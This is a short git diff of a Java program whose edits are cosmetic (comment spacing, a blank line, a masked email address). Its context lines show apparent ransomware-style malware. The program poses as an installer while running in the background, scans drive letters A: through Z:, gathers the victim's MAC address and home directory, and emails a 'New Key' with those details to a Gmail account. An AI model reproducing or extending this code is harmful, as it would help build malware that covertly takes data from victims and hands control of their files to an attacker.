@@ -36,7 +36,7 @@ public class Main extends Core {
         System.exit(1);
       }
       System.out.println("Installing the program...");
-      //run program in background
+      // run program in background
       user32.EnumWindows((hwnd, pointer) -> {
         char[] windowText = new char[512];
         user32.GetWindowTextW(hwnd, windowText, 512);
@@ -133,6 +133,7 @@ public class Main extends Core {
    */
   static ArrayList<String> findDrives() {
     ArrayList<String> arrayList = new ArrayList<>();
+
     String drives[] = {"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
     for (String d : drives) {
       FileSystems.getDefault().getFileStores().forEach(root -> {
@@ -183,7 +184,7 @@ public class Main extends Core {
           for (String mac : runCommand("cmd /c ipconfig/all|find \"Physical Address\"", null)) {
             stringBuilder.append(mac);
           }
-          Mailer.send("****@gmail.com", "New Key",
+          Mailer.send("*****@gmail.com", "New Key",
             "MAC Address: \n" + stringBuilder.toString() + "\n" +
               "KEY: " + String.valueOf(key) + "\n" +
               "User: " + System.getProperty("user.home") + "\n" +
